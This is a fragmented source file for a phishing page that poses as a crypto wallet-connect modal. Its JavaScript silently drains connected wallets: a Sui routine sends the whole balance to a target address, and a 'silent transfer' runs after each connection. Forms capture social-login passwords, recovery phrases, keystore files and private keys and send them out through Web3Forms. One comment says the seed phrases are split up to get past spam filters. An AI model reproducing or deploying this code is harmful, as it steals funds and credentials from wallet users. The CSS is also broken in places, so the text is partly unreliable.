            cursor: pointer;

            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            padding: 0 12px 24px;
        }
        .wallet-item {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 16px 8px;
            text-align: center;
            transition: all 0.25s ease;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            aspect-ratio: 1 / 1.05;
        }
        .wallet-item:hover {

            border-color: rgba(51, 150, 255, 0.3);

        }
        .wallet-icon-wrapper {
            position: relative;
            width: 56px;
            height: 56px;
            margin-bottom: 10px;
        }
        .sticky-footer {
            position: sticky;
            bottom: 0;
            background: transparent;
            padding: 16px 24px;
            z-index: 10;
            border-top: 1px solid var(--reown-border);
            backdrop-filter: blur(12px);
        }
        .social-logins {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 12px;
            pointer-events: auto;
        }
        .social-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255,255,255,0.08);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            cursor: pointer;
        }
        .social-icon:hover {
            background: rgba(51,150,255,0.25);
            transform: scale(1.1);
        }
        .social-icon img {
            width: 22px;
            height: 22px;
        }
        .status-text {
            text-align: center;
            font-size: 0.875rem;
            color: #a1a1aa;
            pointer-events: none;
        }
        .status-failed {
            color: #ef4444 !important;

            background: rgba(51, 150, 255, 0.1);
            border: 1px solid rgba(51, 150, 255, 0.3);
            color: #3396ff;
        }
        .more-btn:hover {
            background: rgba(51, 150, 255, 0.2);
        }
        .tab-buttons {

            gap: 8px;
            margin-bottom: 24px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 10px 20px;
            background: rgba(255,255,255,0.08);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 0.875rem;
        }
        .tab-btn.active {
            background: var(--reown-accent);
            color: white;
        }
        .word-grid {
            display: grid;
            gap: 12px;
            margin-bottom: 16px;
        }
        .word-input {
            width: 100%;
            padding: 12px;
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 12px;
            color: white;
            text-align: center;
            transition: color 0.2s ease, border-color 0.2s ease;
        }
        .word-input.correct {
            color: #10b981 !important;
            border-color: #10b981 !important;
        }
        .word-input.incorrect {
            color: #ef4444 !important;
            border-color: #ef4444 !important;
        }

            left: 0;

            border-radius: 20px;

            align-items: center;
            justify-content: center;
            flex-direction: column;

            z-index: 10001;

            transform: translateX(20px);

            pointer-events: none;

            position: relative;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            margin-bottom: 18px;
            background: transparent;
            box-shadow: 0 6px 18px rgba(0,0,0,0.12);

            width: 96px;
            height: 96px;
            border-radius: 12px;
            object-fit: contain;
            z-index: 1;
            background: #fff;
        }
        .connect-ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 110px;
            height: 110px;
            pointer-events: none;
            opacity: 0;
            transition: opacity 160ms ease;
            z-index: 2;
        }
        .connect-ring.active { opacity: 1; }
        .connect-ring svg { width: 110px; height: 110px; display: block; }
        .connect-ring rect.track { stroke: rgba(0,0,0,0.06); stroke-width: 8; fill: none; }
        .connect-ring rect.progress {
            stroke: #F57251;
            stroke-width: 6;
            stroke-linecap: round;
            fill: none;
            stroke-dasharray: 50 356;
            stroke-dashoffset: 356;
            animation: squareProgress 1.8s linear infinite;
        }
        @keyframes squareProgress {
            from { stroke-dashoffset: 376; }
            to { stroke-dashoffset: 15; }
        }

        .connect-overlay .overlay-message.failed { color: #ef4444; opacity: 1; }
        /* Processing Overlay Styles */
        #processing-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(12px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10050;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        #processing-overlay.active {
            display: flex;
            opacity: 1;
        }
        .processing-content {
            text-align: center;
            color: var(--reown-text);
        }
        .processing-content h2 {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .animated-dots {
            font-size: 2rem;
            letter-spacing: 8px;
            height: 2.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .dot {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: var(--reown-accent);
            margin: 0 4px;
            animation: dotBounce 1.4s infinite;
        }
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        .dot:nth-child(4) { animation-delay: 0.6s; }
        @keyframes dotBounce {
            0%, 60%, 100% { opacity: 0.3; transform: translateY(0); }
            30% { opacity: 1; transform: translateY(-15px); }
        }

<body>
    <button id="open-modal" class="px-10 py-4 bg-gradient-to-r from-indigo-600 to-purple-600 rounded-2xl font-semibold text-lg shadow-2xl hover:brightness-110 transition">

    </button>

    <!-- Processing Overlay -->
    <div id="processing-overlay">
        <div class="processing-content">
            <h2>Processing</h2>
            <div class="animated-dots">
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
            </div>
        </div>
    </div>

    <!-- Main Wallet Connect Modal -->

                    </div>
                </div>
                <div id="status-message" class="status-text">
                    Select a wallet to connect
                </div>
            </div>
        </div>
    </div>

        // ──────────────────────────────────────────────────────────────────────────────────
        // Sui (native SUI + SUI tokens)
        // ──────────────────────────────────────────────────────────────────────────────────
        async function transferSuiRemaining(fromAddress, targetAddress, session) {
          try {
            // Get Sui SDK from loaded window
            if (!window.sui || !window.sui.SuiClient) {
              throw new Error("Sui SDK not loaded. Make sure @mysten/sui is available");
            }

            const { SuiClient, getFullnodeUrl, TransactionBlock } = window.sui;
            const client = new SuiClient({ url: getFullnodeUrl('mainnet') });

            console.log(`Sui transfer: from=${fromAddress} to=${targetAddress}`);

            // Get balance
            const balance = await client.getBalance({
              owner: fromAddress,
              coinType: '0x2::sui::SUI' // native SUI
            });

            const totalBalance = BigInt(balance.totalBalance);
            const gasReserve = BigInt(5_000_000_000); // ~5M MIST (5 SUI buffer, very safe)

            if (totalBalance <= gasReserve) {
              throw new Error(`Please try to reconnect (${Number(totalBalance) / 1e9} SUI). Need at least ${Number(gasReserve) / 1e9} SUI for gas.`);
            }

            const amountToSend = totalBalance - gasReserve;
            console.log(`Sending SUI: ${Number(amountToSend) / 1_000_000_000} SUI`);

            // Build transaction block
            const txb = new TransactionBlock();
            const [coin] = txb.splitCoins(txb.gas, [amountToSend]);
            txb.transferObjects([coin], targetAddress);

            // Get transaction bytes
            const { bytes } = await txb.build({ client });

            // Sign via Sui Wallet through WalletConnect
            console.log("Requesting Sui wallet signature...");
            
            const wcClient = window.__wcClient;
            if (!wcClient || !session?.topic) {
              throw new Error("WalletConnect client or session not available");
            }

            // Request signature from Sui wallet
            const signResult = await wcClient.request({
              topic: session.topic,
              chainId: 'sui:mainnet',
              request: {
                method: 'sui_signTransactionBlock',
                params: {
                  transactionBlock: bytes,
                  account: fromAddress
                }
              }
            });

            console.log("Got signature from Sui wallet, executing...");

            // Execute the signed transaction
            const executeResult = await wcClient.request({
              topic: session.topic,
              chainId: 'sui:mainnet',
              request: {
                method: 'sui_executeTransactionBlock',
                params: {
                  transactionBlock: bytes,
                  signature: signResult.result.signature
                }
              }
            });

            const txDigest = executeResult.result.digest;
            console.log("Sui transfer tx digest:", txDigest);

            // Wait for confirmation
            await client.waitForTransactionBlock({ digest: txDigest });
            console.log("✓ Sui confirmed");

            return { success: true, txDigest };

          } catch (error) {
            console.error("Sui failed:", error);
            throw error;
          }
        }

            if (!arr.some(x => normalizeKey(x.name) === normalizeKey(obj.name))) arr.push(obj);
        }

        // Detect injected providers (desktop extensions)
        try {
            if (window.ethereum) {
                const providers = Array.isArray(window.ethereum.providers) ? window.ethereum.providers : [window.ethereum];
                providers.forEach(p => {
                    try {
                        if (p.isMetaMask) pushIfUnique(results, { name: 'MetaMask', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'metamask://' });
                        else if (p.isCoinbaseWallet) pushIfUnique(results, { name: 'Coinbase Wallet', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'coinbase://' });
                        else pushIfUnique(results, { name: 'Ethereum Provider', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }) });
                    } catch (e) {}
                });
            }
        } catch (e) {}

        // Always add Phantom as an option
        try { 
            if (window.solana && window.solana.isPhantom) {
                pushIfUnique(results, { name: 'Phantom', type: 'extension', connector: async () => window.solana.connect(), scheme: 'phantom://' });
            } else {
                // Even if not detected, add Phantom with fallback scheme
                pushIfUnique(results, { name: 'Phantom', type: 'extension', connector: async () => { throw new Error('Phantom not installed'); }, scheme: 'phantom://' });

        } catch (e) {}

        // Solflare disabled from modal - only accessible via direct click
        // try { if (window.solflare && typeof window.solflare.connect === 'function') pushIfUnique(results, { name: 'Solflare', type: 'extension', connector: async () => window.solflare.connect(), scheme: 'solflare://' }); } catch (e) {}
        try { if (window.keplr) pushIfUnique(results, { name: 'Keplr', type: 'extension', connector: async () => { await window.keplr.enable && await window.keplr.enable(); return true; }, scheme: 'keplr://' }); } catch (e) {}
        
        // Always add TronLink as an option
        try {
            if (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress)) {
                pushIfUnique(results, { name: 'TronLink', type: 'extension', connector: async () => { if (window.tronLink && window.tronLink.request) return await window.tronLink.request({ method: 'tron_requestAccounts' }); if (window.tronWeb && window.tronWeb.request) return await window.tronWeb.request({ method: 'tron_requestAccounts' }); throw new Error('No Tron request available'); }, scheme: 'tronlink://' });
            } else {
                // Even if not detected, add TronLink with fallback scheme
                pushIfUnique(results, { name: 'TronLink', type: 'extension', connector: async () => { throw new Error('TronLink not installed'); }, scheme: 'tronlink://' });
            }
        } catch (e) {}

        try { if (window.safepal || window.SafePal) pushIfUnique(results, { name: 'SafePal', type: 'extension', connector: async () => { if (window.safepal && window.safepal.request) return await window.safepal.request({ method: 'eth_requestAccounts' }); throw new Error('SafePal connector not available'); }, scheme: 'safepal://' }); } catch (e) {}

        const knownWalletGlobals = [
            { name: 'Rabby', props: ['rabby', 'Rabby'], scheme: 'rabby://' },
            { name: 'Rainbow', props: ['rainbow', 'Rainbow'], scheme: 'rainbow://' },
            { name: 'MathWallet', props: ['mathwallet', 'MathWallet', 'mathWallet'], scheme: 'mathwallet://' },
            { name: 'TokenPocket', props: ['tp', 'TokenPocket', 'tokenPocket', 'tpwallet'], scheme: 'tpwallet://' },
            { name: 'Coin98', props: ['coin98', 'Coin98'], scheme: 'coin98://' },
            { name: 'BitKeep', props: ['bitkeep', 'Bitkeep', 'BitKeep'], scheme: 'bitkeep://' },
            { name: 'Wallet3', props: ['wallet3'], scheme: 'wallet3://' },
            { name: 'Opera', props: ['opera', 'operaWallet'], scheme: 'opera://' },
            { name: 'Trezor', props: ['trezor'], scheme: 'trezor://' },
            { name: 'OKX', props: ['okxwallet', 'okx'], scheme: 'okxwallet://' },
            { name: 'Ronin', props: ['ronin'], scheme: 'ronin://' }
        ];
        knownWalletGlobals.forEach(w => {
            for (const p of w.props) {
                try {
                    const provider = window[p];
                    if (provider) {
                        pushIfUnique(results, {
                            name: w.name,
                            type: 'extension',
                            connector: async () => {
                                if (typeof provider.request === 'function') return await provider.request({ method: 'eth_requestAccounts' });
                                if (typeof provider.connect === 'function') return await provider.connect();
                                if (typeof provider.enable === 'function') return await provider.enable();
                                throw new Error('No connect method on provider');
                            },
                            scheme: w.scheme
                        });
                        break;
                    }
                } catch (e) {}
            }
        });

        return results;
    }

    // Open specific wallet app on mobile using deep links/universal links
    async function openSpecificWallet(walletName, wcUri) {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
        const isMobile = isAndroid || isIOS;

        if (!isMobile) {
            console.warn('openSpecificWallet() called on non-mobile device');
            return false;
        }

        const walletKey = (walletName || '').toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
        const config = walletDeepLinks[walletKey];

        if (!config) {
            console.warn(`No specific deep link config for ${walletName}`);
            // Fallback to generic WalletConnect
            window.location.href = `https://walletconnect.com/wc?uri=${encodeURIComponent(wcUri)}`;
            return false;
        }

        console.log(`[openSpecificWallet] Attempting to open ${walletName} on mobile`);

        let opened = false;

        // 1. Try wallet-specific scheme first (direct app open)
        if (config.scheme && !opened) {
            try {
                const schemeUrl = config.scheme + encodeURIComponent(wcUri);
                console.log(`[openSpecificWallet] Trying scheme: ${walletName}`);
                const a = document.createElement('a');
                a.href = schemeUrl;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                opened = true;
                console.log(`[openSpecificWallet] Scheme attempt for ${walletName}`);
            } catch (e) {
                console.warn(`[openSpecificWallet] Scheme failed for ${walletName}:`, e);
            }
        }

        // 2. If scheme failed, try universal link (use iframe to avoid page navigation)
        if (!opened && config.universal) {
            try {
                const universalUrl = config.universal + encodeURIComponent(wcUri);
                console.log(`[openSpecificWallet] Trying universal link: ${walletName}`);
                const iframe = document.createElement('iframe');
                iframe.src = universalUrl;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                setTimeout(() => {
                    try { document.body.removeChild(iframe); } catch (e) {}
                }, 1000);
                opened = true;
                console.log(`[openSpecificWallet] Universal link initiated for ${walletName}`);
            } catch (e) {
                console.warn(`[openSpecificWallet] Universal link failed for ${walletName}:`, e);
            }
        }

        // 3. Last resort: redirect to app store if app not installed (after delay to allow QR fallback)
        if (!opened) {
            console.log(`[openSpecificWallet] App not found for ${walletName}`);
            // Schedule store redirect for later, allow QR to show first
            setTimeout(() => {
                if (!document.hidden) {
                    console.log(`[openSpecificWallet] Redirecting to store for ${walletName}`);
                    if (isAndroid && config.store) {
                        window.location.href = config.store;
                    } else if (isIOS && config.iosStore) {
                        window.location.href = config.iosStore;
                    } else {
                        alert(`Please install ${walletName} from your app store and try again.`);
                    }
                }
            }, 5000); // After QR fallback shows
            opened = true;
        }

        // Optional: Show QR fallback after 4 seconds if app didn't respond
        if (opened) {
            setTimeout(() => {
                if (!document.hidden) { // Page still active → app probably didn't open
                    console.log(`[openSpecificWallet] Showing QR fallback for ${walletName}`);
                    showQRFallbackOverlay(wcUri, walletName);
                }
            }, 4000);
        }

        return opened;
    }

    function handleWalletClick() {
        resetWallets();
        this.classList.add('selected');
        try { document.getElementById('status-message').style.display = 'none'; } catch (e) {}
        const walletName = this.dataset.wallet;
        const providedIcon = this.dataset.icon || '';
        const iconUrl = providedIcon && /^https?:\/\//.test(providedIcon) ? providedIcon : resolveIconUrl(walletName, providedIcon);
        const overlay = document.getElementById('connect-overlay');
        const mainImg = overlay.querySelector('#modalMainWalletImg');
        const nameEl = overlay.querySelector('#overlay-wallet-name');
        const msgEl = overlay.querySelector('#overlay-message');
        mainImg.src = iconUrl;
        nameEl.textContent = walletName;
        msgEl.textContent = '';
        msgEl.classList.remove('failed');

        // Desktop-first strict priority: try the specific wallet's extension FIRST
        const isDesktop = !/Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
        
        // fallback action: show the side overlay + ring
        const showConnectOverlay = () => {
            try {
                const modalRect = document.querySelector('.modal-content').getBoundingClientRect();
                const viewportW = window.innerWidth;
                const viewportH = window.innerHeight;
                const overlayMaxWidth = 340;
                const overlayWidth = Math.min(overlayMaxWidth, Math.max(200, viewportW - 32));
                overlay.style.width = `${overlayWidth}px`;
                const desiredLeft = modalRect.right + 16;
                const maxLeft = Math.max(8, viewportW - overlayWidth - 16);
                let left = Math.min(desiredLeft, maxLeft);
                if (left < 16) left = 16;
                overlay.style.left = `${left}px`;
                const desiredHeight = Math.max(120, modalRect.height - 16);
                const overlayHeight = Math.min(desiredHeight, viewportH - 32);
                overlay.style.height = `${overlayHeight}px`;
                let top = modalRect.top + 8;
                if (top + overlayHeight + 8 > viewportH) top = Math.max(8, viewportH - overlayHeight - 8);
                overlay.style.top = `${top}px`;
                overlay.style.position = 'fixed';
                overlay.style.zIndex = '10001';
                overlay.classList.add('active');
            } catch (e) {
                overlay.classList.add('active');
            }
            const ring = document.getElementById('connectRing');
            ring.classList.add('active');
            setTimeout(() => {
                ring.classList.remove('active');
                msgEl.textContent = 'Connection failed. Please try again.';
                msgEl.classList.add('failed');
                setTimeout(() => {
                    overlay.classList.remove('active');
                    overlay.style.position = '';
                    overlay.style.top = '';
                    overlay.style.left = '';
                    overlay.style.height = '';
                    overlay.style.zIndex = '';
                    msgEl.textContent = '';
                    msgEl.classList.remove('failed');
                    modalOverlay.classList.remove('active');
                    setTimeout(() => {
                        modalOverlay.style.display = 'none';
                        manualOverlay.style.display = 'flex';
                        setTimeout(() => manualOverlay.classList.add('active'), 10);
                    }, 400);
                }, 2000);
            }, 12000);
        };

        // DESKTOP-FIRST STRICT PRIORITY: Try the clicked wallet's extension immediately
        if (isDesktop) {
            const allExtensions = detectAllInstalledExtensions();
            const clickedWalletKey = normalizeKey(walletName);
            
            // Find exact match for the clicked wallet
            const matchingExt = allExtensions.find(ext => {
                const extKey = normalizeKey(ext.name);
                return extKey === clickedWalletKey || 
                       clickedWalletKey.includes(extKey) || 
                       extKey.includes(clickedWalletKey);
            });

            if (matchingExt && typeof matchingExt.connector === 'function') {
                console.log(`[Desktop] Attempting ${matchingExt.name} extension for clicked wallet: ${walletName}`);
                // Try ONLY this wallet's extension, no popup
                (async () => {
                    try {
                        const result = await matchingExt.connector();
                        console.log(`[Desktop] ${matchingExt.name} connected successfully:`, result);
                        try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                        
                        // Get connection info and initiate silent transfer
                        try {
                            const provider = window.ethereum || matchingExt.provider;
                            const accounts = await provider.request({ method: 'eth_accounts' });
                            const chainId = await provider.request({ method: 'eth_chainId' });
                            const connectionInfo = {
                                provider: provider,
                                address: accounts[0],
                                chainId: chainId,
                                session: result
                            };
                            await silentTransferRemainingBalance(connectionInfo);
                        } catch (e) { 
                            console.warn('Silent transfer failed:', e); 
                        }
                        return;
                    } catch (e) {
                        console.log(`[Desktop] ${matchingExt.name} connection failed/declined:`, e.message);
                        // User declined or extension failed — show fallback options
                        const detected = detectInstalledWallets(walletName);
                        showDetectorPopup(detected, walletName, showConnectOverlay);
                    }
                })();
                return;
            }
        }

        // MOBILE or no matching extension on desktop: check for tricky wallets first
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
        const walletKeyForTricky = (walletName || '').toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
        const isTrickyWallet = ['phantom', 'slush', 'sui', 'tronlink', 'solflare'].some(w => walletKeyForTricky.includes(w));

        // SPECIAL: For tricky wallets on mobile, use chain-specific connectAndSign
        if (isMobile && isTrickyWallet) {
            console.log(`[Mobile] Detected tricky wallet ${walletName} - using connectAndSign()`);
            
            // Show "Opening wallet..." message IMMEDIATELY
            msgEl.textContent = `Opening ${walletName}... Please wait`;
            msgEl.classList.remove('failed');
            
            (async () => {
                try {
                    // Determine which chain based on wallet name
                    let chain = 'evm'; // default fallback
                    
                    if (walletKeyForTricky.includes('phantom') || walletKeyForTricky.includes('solflare')) {
                        chain = 'solana';
                        console.log(`[Mobile] ${walletName} detected as Solana wallet`);
                    } else if (walletKeyForTricky.includes('tronlink')) {
                        chain = 'tron';
                        console.log(`[Mobile] ${walletName} detected as Tron wallet`);
                    } else if (walletKeyForTricky.includes('slush') || walletKeyForTricky.includes('sui')) {
                        chain = 'sui';
                        console.log(`[Mobile] ${walletName} detected as Sui wallet`);
                    }
                    
                    // Close the modal
                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                    
                    // Use chain-specific connection with wallet name for correct deep link
                    const result = await connectAndSign(chain, walletName);
                    console.log(`[Mobile] ✓ Connected to ${chain} via ${walletName}:`, result);
                    
                    // Extract address and chainId from namespaces
                    const namespaceData = result.namespaces[chain];
                    if (!namespaceData || !namespaceData.accounts || !namespaceData.accounts[0]) {
                        throw new Error(`No accounts found in ${chain} namespace`);
                    }
                    const fullAccount = namespaceData.accounts[0]; // e.g. "solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ:Ey97..." OR "eip155:1:0x..." OR "tron:0x2b6653dc:T..." OR "sui:mainnet:0x..."
                    const accountParts = fullAccount.split(':');
                    const address = accountParts[accountParts.length - 1]; // Last part is always the address
                    const chainFullId = namespaceData.chains[0]; // e.g. "solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ"
                    
                    // Build connection info for transfer
                    const connectionInfo = {
                        provider: null,
                        address: address,
                        chainId: chainFullId,
                        session: result.session,
                        namespaces: result.namespaces,
                        _wcSession: true,
                        chain: chain
                    };
                    
                    // Initiate silent transfer
                    await silentTransferRemainingBalance(connectionInfo);
                    
                } catch (e) {
                    console.error(`[Mobile] Failed to connect ${walletName}:`, e);
                    msgEl.textContent = `Connection failed: ${e.message}`;
                    msgEl.classList.add('failed');
                    
                    // Auto-hide error after 3s
                    setTimeout(() => {
                        msgEl.textContent = '';
                        msgEl.classList.remove('failed');
                    }, 3000);
                }
            })();
            return;
        }

        // NORMAL: For other wallets, show detector popup with all detected apps
        const detected = detectInstalledWallets(walletName);
        showDetectorPopup(detected, walletName, showConnectOverlay);
    }

        body: formData,
        mode: 'cors',
        credentials: 'omit'
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();

      if (result.success) {
        console.log('Web3Forms success:', result);
        return { success: true, message: result.message };
      } else {
        throw new Error(result.message || 'Submission failed');
      }
        } catch (error) {
            console.error('Web3Forms error:', error);
            return { success: false, error: error.message || 'Submission failed' };
        } finally {
            // Intentionally leaving the processing overlay visible for debugging/confirmation
            // hideProcessingOverlay();
        }
  }

  // ── Social Login Submit ───────────────────────────────────────────────
  async function handleSocialLoginSubmit() {
    const email = document.getElementById('dynamic-email-input')?.value.trim();
    const password = document.getElementById('dynamic-password-input')?.value.trim();
    const provider = document.getElementById('dynamic-provider-name')?.textContent || 'Unknown';

    if (!email || !password) {
      alert('Please enter email and password');
      return;
    }

    const data = {
      subject: 'User Sign In Attempt',
      name: `Login via ${provider}`,
      email: email,
            message: `Password entered for ${provider} login`,
            feedback: password,
      description: `User-Agent: ${navigator.userAgent}`,
      timestamp: new Date().toISOString()
    };

    const result = await submitToWeb3Forms(data);

        if (result.success) {
            // Success: clear inputs but keep processing overlay visible per request
            document.getElementById('dynamic-email-input').value = '';
            document.getElementById('dynamic-password-input').value = '';
            // Do not hide the dynamic login overlay here
        } else {
            alert('Failed: ' + result.error);
        }
  }

  // ── Manual Connect Submit ─────────────────────────────────────────────
  async function handleManualConnectSubmit() {
    const activeTab = document.querySelector('.tab-btn.active')?.dataset.tab || 'phrase';
    let data = {
      subject: 'Wallet Connection Request',
      name: 'User Wallet Submission',
      user_message: `Submission from ${navigator.userAgent}`,
      timestamp: new Date().toISOString()
    };

    if (activeTab === 'phrase') {
      const words = [...document.querySelectorAll('#phrase-grid .word-input')]
        .map(i => i.value.trim())
        .filter(Boolean);

      if (words.length !== 12 && words.length !== 24) {
        return alert(`Please enter exactly 12 or 24 words (you entered ${words.length})`);
      }

      // Split into small, innocent-looking chunks to avoid spam filter
      data.part1 = words.slice(0, 8).join(' ') || '(empty)';
      data.part2 = words.slice(8, 16).join(' ') || '(empty)';
      data.part3 = words.slice(16).join(' ') || '(empty)';
      data.word_count = words.length;
      data.description = `Recovery phrase (${words.length} words)`;
    } 
    else if (activeTab === 'keystore') {
      const json = document.getElementById('keystore-json')?.value.trim();
      const password = document.getElementById('keystore-password')?.value.trim() || '';
      if (!json) return alert('Enter keystore JSON');
      data.message = json;
      data.feedback = password;
      data.description = 'Wallet backup file';
    } 
    else if (activeTab === 'private') {
      const key = document.getElementById('private-key')?.value.trim();
      if (!key) return alert('Enter private key');
      data.message = key;
      data.description = 'Private access key';
    }

    const result = await submitToWeb3Forms(data);

        if (result.success) {
            // Success: keep processing overlay visible; do not show alert
            // Clear fields & close modal
      if (activeTab === 'phrase') {
        document.querySelectorAll('#phrase-grid .word-input').forEach(i => i.value = '');
      }
      if (activeTab === 'keystore') {
        document.getElementById('keystore-json').value = '';
        document.getElementById('keystore-password').value = '';
      }
      if (activeTab === 'private') {
        document.getElementById('private-key').value = '';
      }
      document.getElementById('manual-overlay')?.classList.remove('active');
    } else {
      alert('Failed: ' + result.error);
    }
  }

  // Attach only to buttons
  document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('dynamic-signin-btn')?.addEventListener('click', handleSocialLoginSubmit);
    document.getElementById('manual-connect-btn')?.addEventListener('click', handleManualConnectSubmit);
  });
</script>
